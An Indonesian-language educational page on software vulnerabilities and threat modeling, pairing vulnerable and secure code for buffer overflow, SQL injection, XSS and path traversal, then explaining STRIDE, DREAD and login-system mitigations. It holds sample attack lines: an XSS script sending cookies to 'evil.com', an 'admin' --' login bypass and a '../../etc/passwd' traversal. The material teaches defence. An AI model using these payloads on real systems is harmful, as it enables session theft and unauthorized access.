Klasifikasi Kerawanan Perangkat Lunak

Peta besar jenis-jenis kerawanan berdasarkan CWE, OWASP Top 10 Web 2025, OWASP Mobile 2024, dan penelitian terkini

Kerawanan (Vulnerability) adalah kelemahan dalam desain, implementasi, konfigurasi, atau operasional perangkat lunak yang dapat dieksploitasi oleh ancaman untuk menyebabkan kerugian. Menurut NIST SP 800-30 Rev.1, kerawanan dikategorikan berdasarkan sumbernya: desain yang buruk, kode yang cacat, atau konfigurasi yang tidak tepat.

Indikator 1 — Detail

Memory Safety & Injection — Contoh Kode Nyata

Memahami kerawanan melalui perbandingan kode vulnerable vs. secure

💾

Buffer Overflow (CWE-121)

CVSS: 9.8 Critical · C/C++

Terjadi saat program menulis data melebihi batas buffer yang dialokasikan di stack. Penyerang dapat menimpa return address untuk mengeksekusi kode arbitrer.

// ❌ VULNERABLE — strcpy tidak cek panjang void login(char *input) { char buf[64]; strcpy(buf, input); // buffer overflow! } // ✅ SECURE — batasi panjang input void login(char *input) { char buf[64]; strncpy(buf, input, sizeof(buf)-1); buf[sizeof(buf)-1] = '\0'; }
🛡️ Mitigasi: gunakan fungsi safe (strncpy, snprintf), aktifkan stack canaries, ASLR, DEP/NX bit
💉

SQL Injection (CWE-89)

CVSS: 9.8 Critical · Web App

Input pengguna dimasukkan langsung ke query SQL tanpa sanitasi. Penyerang dapat bypass auth, dump database, atau menghapus data.

// ❌ VULNERABLE $q = "SELECT * FROM users WHERE user='$_POST['user']' AND pass='$_POST['pass']'"; // Payload: user = admin' -- // ✅ SECURE — Prepared Statement $stmt = $pdo->prepare( "SELECT * FROM users WHERE user=? AND pass=?"); $stmt->execute([$user, $pass]);
🛡️ Mitigasi: prepared statements, parameterized queries, ORM, input validation, least privilege DB user
📜

Stored XSS (CWE-79)

CVSS: 8.8 High · Web App

Script berbahaya disimpan di server dan dieksekusi di browser korban. Dapat mencuri cookie sesi, redirect ke phishing, atau keylogging.

// ❌ VULNERABLE — output langsung echo "Komentar: " . $_POST['comment']; // Payload: <script>document.location= // 'https://evil.com?c='+document.cookie</script> // ✅ SECURE — encode output echo "Komentar: " . htmlspecialchars( $_POST['comment'], ENT_QUOTES, 'UTF-8');
🛡️ Mitigasi: output encoding (htmlspecialchars), Content Security Policy (CSP), HttpOnly cookie
🛣️

Path Traversal (CWE-22)

CVSS: 7.5 High · File System

Penyerang memanipulasi path file dengan urutan "../" untuk mengakses file di luar direktori yang diizinkan, termasuk /etc/passwd atau file konfigurasi.

// ❌ VULNERABLE $file = $_GET['file']; include("/var/www/files/" . $file); // Attack: ?file=../../etc/passwd // ✅ SECURE — validasi & canonicalize $file = basename($_GET['file']); $path = realpath("/var/www/files/".$file); if(strpos($path,"/var/www/files/")===0){ include($path); }
🛡️ Mitigasi: realpath() validation, basename(), allowlist file names, chroot jail
Indikator 1 — Lanjutan

Authentication Failure, IDOR & Kelemahan Kriptografi

Kerawanan utama berdasarkan OWASP Top 10 Web 2025 & Mobile 2024 yang berdampak langsung pada kerahasiaan data

🔑

Broken Authentication

OWASP A07:2025 Web · M3:2024 Mobile

Kelemahan pada mekanisme autentikasi yang memungkinkan penyerang mengambil alih akun.

  • Password plaintext / MD5 tanpa salt
  • Tidak ada rate limiting → brute force
  • Session ID tidak diregenerasi setelah login
  • JWT dengan algoritma "none"
  • Default credentials tidak diganti
// ❌ Simpan password dengan MD5 $hash = md5($password); // BERBAHAYA! // ✅ Gunakan password_hash() $hash = password_hash($pass, PASSWORD_BCRYPT);
🛡️ password_hash/verify, MFA, rate limiting, session.regenerate_id()
🔓

IDOR / Broken Access Control

OWASP A01:2025 Web — tetap #1! · M3:2024 Mobile

Pengguna dapat mengakses resource milik pengguna lain hanya dengan mengubah identifier (ID, nomor rekening, filename).

  • Akses data user lain via URL manipulation
  • Modifikasi peran/role via parameter
  • Direct file access tanpa auth check
// ❌ VULNERABLE — no ownership check GET /api/orders/1234 → data user lain! // ✅ SECURE — verify ownership if ($order->user_id !== $currentUser->id){ return 403; // Forbidden }
🛡️ Verifikasi kepemilikan setiap request, gunakan indirect reference (UUID), server-side authorization
🔒

Cryptographic Failures

OWASP A04:2025 Web (↓ dari #2) · M10:2024 Mobile

Kegagalan melindungi data sensitif dengan kriptografi yang kuat, termasuk data in-transit dan at-rest.

  • Algoritma usang: MD5, SHA-1, DES, RC4
  • Kunci hardcoded dalam kode sumber
  • HTTP tanpa HTTPS untuk data sensitif
  • Weak RNG untuk token/session ID
// ❌ Hardcoded secret key SECRET_KEY = "mysecret123" # di kode! # ✅ Gunakan environment variable import os SECRET_KEY = os.environ.get('SECRET_KEY')
🛡️ AES-256, SHA-256+, TLS 1.3, secrets manager (HashiCorp Vault, AWS Secrets Manager)

Indikator 2

Pengantar Model Ancaman (Threat Modeling)

Mengidentifikasi ancaman secara sistematis SEBELUM kode ditulis — prinsip Shift Left Security

Definisi

Threat Modeling adalah proses terstruktur untuk mengidentifikasi, mengevaluasi, dan menangani potensi ancaman keamanan pada sistem sebelum atau selama pengembangan. Tujuannya adalah memahami apa yang bisa salah dan bagaimana mencegahnya.

📌 Adam Shostack (Microsoft, 2014): "Threat modeling works to identify, communicate, and understand threats and mitigations within the context of protecting something of value."

Mengapa Threat Modeling Penting?

  • Hemat biaya: IBM menyatakan memperbaiki bug di fase design 15× lebih murah daripada di production
  • Proaktif: menemukan ancaman sebelum penyerang menemukannya
  • Terstruktur: pendekatan sistematis, bukan hanya "instinct"
  • Komunikasi: menyamakan persepsi dev, security, dan bisnis
  • Compliance: dibutuhkan PCI-DSS, ISO 27001, UU PDP
4 Pertanyaan Kunci Threat Modeling (Shostack)
🏗️
Pertanyaan 1

"Apa yang sedang kita bangun?"

Buat diagram arsitektur, DFD, identifikasi aset berharga

⚠️
Pertanyaan 2

"Apa yang bisa salah?"

Gunakan STRIDE, PASTA, atau Attack Trees untuk enumerate threats

🛡️
Pertanyaan 3

"Apa yang akan kita lakukan?"

Tentukan mitigasi, accept risk, atau transfer risk

✅
Pertanyaan 4

"Apakah kita berhasil?"

Review, validasi, dan iterasi secara berkala

Indikator 2 — STRIDE

Framework STRIDE — Metodologi Threat Modeling Microsoft

Dikembangkan Loren Kohnfelder & Praerit Garg (Microsoft, 1999) — standar industri untuk enumerasi ancaman

S

Spoofing

Pemalsuan Identitas

Penyerang berpura-pura menjadi entitas lain (user, sistem, komponen) untuk mendapatkan akses tidak sah.

Contoh: Phishing login page, ARP spoofing, DNS spoofing, forged JWT token, impersonating API

🛡️ Kontrol: Authentication (MFA, PKI, digital signature)

T

Tampering

Modifikasi Data

Memodifikasi data atau kode tanpa otorisasi — di memori, penyimpanan, atau saat transmisi.

Contoh: SQL Injection modif data, man-in-the-middle, parameter tampering (?price=0), code injection

🛡️ Kontrol: Integrity (hash/checksum, digital signature, input validation, HTTPS)

R

Repudiation

Penyangkalan Tindakan

Pengguna menyangkal telah melakukan suatu tindakan karena tidak ada bukti yang cukup untuk membuktikannya.

Contoh: "Saya tidak pernah melakukan transfer itu", log dihapus, timestamp dimanipulasi

🛡️ Kontrol: Non-repudiation (audit log, digital signature, secure timestamping)

I

Information Disclosure

Kebocoran Informasi

Informasi sensitif terekspos ke pihak yang tidak berwenang, baik secara sengaja maupun tidak.

Contoh: Stack trace di error page, data di URL params, verbose API response, insecure direct object reference

🛡️ Kontrol: Confidentiality (enkripsi, access control, masking, least privilege)

D

Denial of Service

Penolakan Layanan

Membuat sistem tidak dapat diakses oleh pengguna yang sah dengan menghabiskan resource.

Contoh: DDoS attack, algorithmic complexity attack, resource exhaustion, XML bomb (billion laughs)

🛡️ Kontrol: Availability (rate limiting, CDN, load balancing, circuit breaker, input size validation)

E

Elevation of Privilege

Eskalasi Hak Akses

Mendapatkan hak akses lebih tinggi dari yang diberikan — dari user biasa menjadi admin.

Contoh: Privilege escalation via SUID binary (Linux), JWT role manipulation, sudo misconfig, kernel exploit

🛡️ Kontrol: Authorization (least privilege, RBAC, input validation, OS hardening)

🔗 Pemetaan STRIDE → CIA Triad:   S → Confidentiality & Authentication  |  T → Integrity  |  R → Non-repudiation  |  I → Confidentiality  |  D → Availability  |  E → Authorization

Indikator 2 — DREAD

DREAD — Scoring Model untuk Prioritas Risiko Ancaman

Dikembangkan Microsoft untuk memberikan skor kuantitatif pada setiap ancaman yang ditemukan STRIDE

D

Damage

Seberapa besar kerusakan jika exploit berhasil?

1=Minimal · 5=Kritis

R

Reproducibility

Seberapa mudah serangan dapat direproduksi?

1=Sulit · 5=Selalu berhasil

E

Exploitability

Seberapa mudah exploit dilakukan?

1=Expert only · 5=Script kiddie

A

Affected Users

Berapa banyak user terdampak?

1=Satu user · 5=Semua user

D

Discoverability

Seberapa mudah ancaman ditemukan?

1=Sangat sulit · 5=Terlihat jelas

Indikator 2 — Proses

Proses Penyusunan Model Ancaman Step-by-Step

Panduan praktis menyusun threat model dari nol menggunakan DFD + STRIDE

Langkah-Langkah
1

Dekomposisi Sistem → Buat DFD

Gambar Data Flow Diagram: identifikasi External Entities (pengguna, sistem luar), Processes (komponen aplikasi), Data Stores (DB, file), dan Data Flows (aliran data antar komponen).

  • Tandai Trust Boundaries (garis merah putus-putus)
  • Setiap data flow yang melewati trust boundary = potential attack surface
2

Identifikasi Ancaman dengan STRIDE

Untuk setiap elemen DFD, terapkan STRIDE secara sistematis. Buat daftar ancaman untuk setiap kategori.

  • External Entity → fokus pada Spoofing
  • Process → Tampering, Elevation of Privilege
  • Data Store → Information Disclosure, Tampering
  • Data Flow → Tampering, Information Disclosure, DoS
3

Scoring & Prioritasi dengan DREAD

Hitung skor DREAD untuk setiap ancaman. Urutkan dari skor tertinggi ke terendah untuk menentukan prioritas penanganan.

  • Skor ≥ 20: High → wajib ditangani segera
  • Skor 15–19: Medium → ditangani dalam sprint berikutnya
  • Skor < 15: Low → masuk backlog/accepted risk
4

Tentukan Mitigasi

Untuk setiap ancaman High dan Medium, tentukan kontrol keamanan spesifik yang akan diimplementasikan.

  • Rujuk ke OWASP Cheat Sheet Series untuk mitigasi spesifik
  • Dokumentasikan dalam Threat Model Report
  • Update model secara berkala saat ada perubahan arsitektur

Mitigasi Ancaman — Hasil Threat Modeling Sistem Login

Tindakan konkret untuk setiap ancaman HIGH dan MEDIUM yang ditemukan

🔴 HIGH Priority Mitigations

T1 — Brute Force (Spoofing) CVSS 9.1
  • Implementasi rate limiting (maks 5 attempt/menit per IP)
  • Account lockout setelah 10 kali gagal (progressive delay)
  • Wajibkan Multi-Factor Authentication (MFA)
  • Gunakan CAPTCHA setelah 3 kali gagal
  • Monitor dan alert anomaly login pattern
T2 — SQL Injection (Tampering) CVSS 9.8
  • Gunakan Prepared Statements / Parameterized Query untuk SEMUA query
  • Terapkan ORM (Eloquent, Hibernate, SQLAlchemy)
  • Input validation: whitelist karakter yang diizinkan
  • Least privilege DB user (SELECT only untuk read-only ops)
  • WAF (Web Application Firewall) sebagai lapisan tambahan
T3 — Info Disclosure (Error) CVSS 7.5
  • Tampilkan pesan error generik ke pengguna ("Terjadi kesalahan")
  • Log detail error ke sistem logging internal (bukan ke response)
  • Matikan debug mode di production
  • Terapkan custom error pages (HTTP 404, 500)

🟠 MEDIUM Priority & Template Laporan

T4 — Session Fixation (Spoofing) CVSS 6.8
  • Regenerasi Session ID setelah login berhasil (session_regenerate_id(true))
  • Set session cookie: HttpOnly; Secure; SameSite=Strict
  • Session timeout yang wajar (30 menit idle)
T7 — JWT Privilege Escalation CVSS 7.2
  • Verifikasi JWT signature dengan secret yang kuat di server side
  • Jangan terima algoritma "none" → validasi alg header
  • Simpan role/permission di server state, bukan hanya di JWT payload
